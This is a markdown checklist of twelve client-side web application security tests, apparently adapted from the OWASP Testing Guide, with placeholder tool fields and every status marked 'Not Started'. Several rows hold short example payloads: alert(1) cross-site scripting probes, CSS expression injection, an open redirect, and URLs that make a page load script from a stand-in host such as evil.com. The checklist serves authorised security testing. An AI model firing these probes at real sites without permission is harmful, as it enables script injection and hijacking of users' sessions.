---
---

|Client-Side Testing|Test Name|Description|Tools|Status|Comment|
|-------------------|---------|-----------|-----|------|-------|
|OTG-CLIENT-001|DOM-based Cross-Site Scripting|Test for the user inputs obtained from client-side JavaScript Objects|{{proxy}}|Not Started||
|OTG-CLIENT-002|JavaScript Execution|Inject JavaScript code: `www.victim.com/?javascript:alert(1)`|{{proxy}}|Not Started||
|OTG-CLIENT-003|HTML Injection|Send malicious HTML code: `?user=<img%20src='aaa'%20onerror=alert(1)>`|{{proxy}}|Not Started||
|OTG-CLIENT-004|Client-Side URL Redirect|Modify untrusted URL input to a malicious site: (Open Redirect) `?redirect=www.fake-target.site`|{{proxy}}|Not Started||
|OTG-CLIENT-005|CSS Injection|Inject code in the CSS context: `www.victim.com/#red;-o-link:'javascript:alert(1)';-o-link-source:current; (Opera [8,12])`, `www.victim.com/#red;-:expression(alert(URL=1)); (IE 7/8)`|{{proxy}}|Not Started||
|OTG-CLIENT-006|Client-Side Resource Manipulation|External JavaScript could be easily injected in the trusted web site `www.victim.com/#http://evil.com/js.js`|{{proxy}}|Not Started||
|OTG-CLIENT-007|Cross-Origin Resource Sharing|Check the HTTP headers in order to understand how CORS is used (Origin Header)|{{proxy}}|Not Started||
|OTG-CLIENT-008|Cross-Site Flashing|Decompile, Undefined variables, Unsafe methods, Include malicious SWF (`http://victim/file.swf?lang=http://evil`)|{{custom}}|Not Started||
|OTG-CLIENT-009|Clickjacking|Discover if a website is vulnerable by loading into an iframe, create simple web page that includes a frame containing the target.|{{proxy}}|Not Started||
|OTG-CLIENT-010|WebSockets|Identify that the application is using WebSockets by inspecting `ws://` or `wss://` URI scheme. Use Developer Tools in the browser to view the Network WebSocket communication. Check Origin, Confidentiality and Integrity, Authentication, Authorization, Input Sanitization|{{proxy}}|Not Started||
|OTG-CLIENT-011|Web Messaging|Analyse JavaScript code looking for how Web Messaging is implemented. How the website is restricting messages from untrusted domain and how the data is handled even for trusted domains|{{proxy}}|Not Started||
|OTG-CLIENT-012|Local Storage|Determine whether the website is storing sensitive data in the storage. XSS in localstorage `http://server/StoragePOC.html#<img src=x onerror=alert(1)>`|{{browser}}, {{proxy}}|Not Started||
